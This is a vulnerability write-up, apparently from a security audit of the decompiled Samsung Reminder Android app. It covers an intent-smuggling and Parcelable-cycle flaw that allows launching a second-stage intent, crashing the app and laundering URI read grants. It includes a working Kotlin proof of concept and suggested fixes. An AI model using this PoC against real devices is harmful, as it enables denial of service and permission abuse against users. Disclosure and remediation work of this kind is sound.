## [V-011] AddDelegate `D.l` â€” Self-Referential `Intent` Parcelable-Extra Gadget

**File:** `sources/com/samsung/android/app/reminder/ui/detail/add/D.java` (lines 581â€“583)
**Severity:** Medium â€” Parcel cycle / DoS / possible permission-grant laundering via recursion.
**Class of flaw:** CWE-674 (uncontrolled recursion) + CWE-502 flavour (Parcelable cycle).

### Summary
In the `booleanExtra3 || z15` (share / ReminderAddView) branch:
```java
intentC = com.samsung.android.app.reminder.ui.list.main.M.c(stringExtra2);  // attacker-smuggled (V-008)
...
if (((Intent) intentC.getParcelableExtra(WearContract.Subject.ACTION)) == null) {
    intentC.putExtra(WearContract.Subject.ACTION, intentC);                  // âš  self-embeds
}
intentC.putExtras(intent3);              // attacker's original extras flow into smuggled intent
intentC.setClipData(intent3.getClipData());
intentC.addFlags(1);                      // FLAG_GRANT_READ_URI_PERMISSION
intent2 = intentC;
```

The branch guard `((Intent) intentC.getParcelableExtra(WearContract.Subject.ACTION)) == null` can be **pre-satisfied by the attacker** â€” they set the `WearContract.Subject.ACTION` extra on the smuggled Intent themselves (to any attacker-chosen Intent), so the self-embed step is skipped and the attacker-supplied sub-Intent remains nested inside `intentC`. Downstream code that unboxes `intent.getParcelableExtra(WearContract.Subject.ACTION)` will then receive the attacker's alternate Intent â€” effectively smuggling a **second** Intent through the share-intent flow.

Alternatively, if the attacker does not pre-set it, line 582 creates a **Parcelable cycle** (intentC references itself via its own extra). When this Intent is later serialised via `toUri(1)` (line 256, line 305) or via `Bundle.writeToParcel`, the JVM traverses the cycle until stack exhaustion or OOM â€” giving a denial-of-service primitive against the reminder app, and in worst case exploitable via specific Parcel-writer corner cases.

`intentC.putExtras(intent3)` then merges the attacker's **original** extras into the smuggled Intent, and `setClipData(intent3.getClipData())` transfers ClipData with its `FLAG_GRANT_READ_URI_PERMISSION` grants into the smuggled Intent. The attacker thus retains URI grants across the Intent "swap" and adds `addFlags(1)` (FLAG_GRANT_READ_URI_PERMISSION) explicitly.

### Attacker capability
* Smuggle a **second-stage** Intent via `WearContract.Subject.ACTION` extra on the popover_intent payload; later code that `getParcelableExtra(WearContract.Subject.ACTION)` will launch it.
* **Crash** the reminder process on demand by forcing the Parcelable cycle through a Bundle path.
* Preserve FLAG_GRANT_READ_URI_PERMISSION + ClipData URI grants onto the smuggled Intent, effectively laundering permission grants across the Intent exchange.

### PoC sketch
```kotlin
val stage2 = Intent().apply {
    component = ComponentName("com.samsung.android.app.reminder",
        "com.samsung.android.app.reminder.ui.detail.add.AddActivity")
    action = "com.samsung.android.app.reminder.action.ReminderAddView"
    putExtra("uuid", victimUuid)
    putExtra("add_view_type", 2)
}
val stage1 = Intent().apply {                                   // delivered as popover_intent
    action = "com.samsung.android.app.reminder.action.ReminderAddView"
    component = ComponentName("com.samsung.android.app.reminder",
        "com.samsung.android.app.reminder.ui.detail.add.AddActivity")
    // Pre-fill WearContract.Subject.ACTION so D.l doesn't self-embed; stage2 travels inside stage1:
    putExtra("action", stage2)                                  // WearContract.Subject.ACTION == "action"
}
// No setPackage â€” M.c's null-package branch passes (V-008)

val reach = Intent(Intent.ACTION_VIEW).apply {
    setClassName("com.samsung.android.app.reminder",
        "com.samsung.android.app.reminder.ui.detail.view.DetailActivity")
    data = Uri.parse("reminder://viewdetail/?fromBrief=true")
    putExtra("add_reminder_from_share", true)                   // forces the V-011 branch
    putExtra("popover_intent", stage1.toUri(Intent.URI_INTENT_SCHEME))
    clipData = ClipData.newRawUri("c", Uri.parse("content://com.attacker/x"))
    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_GRANT_READ_URI_PERMISSION)
}
startActivity(reach)
```

### Root-cause fixes
1. Drop the "self-embed on missing" branch entirely. A fresh Intent built by the reminder app never needs to carry itself in an extra; this line was evidently added as a marker, not as a security-critical step.
2. On `getParcelableExtra(WearContract.Subject.ACTION)`, reject any Intent whose component is outside the reminder package, and drop caller-supplied ClipData / grant flags during the `putExtras` merge.
3. Never call `intent.putExtras(attackerIntent)` â€” use a strict allow-list of extras to copy.

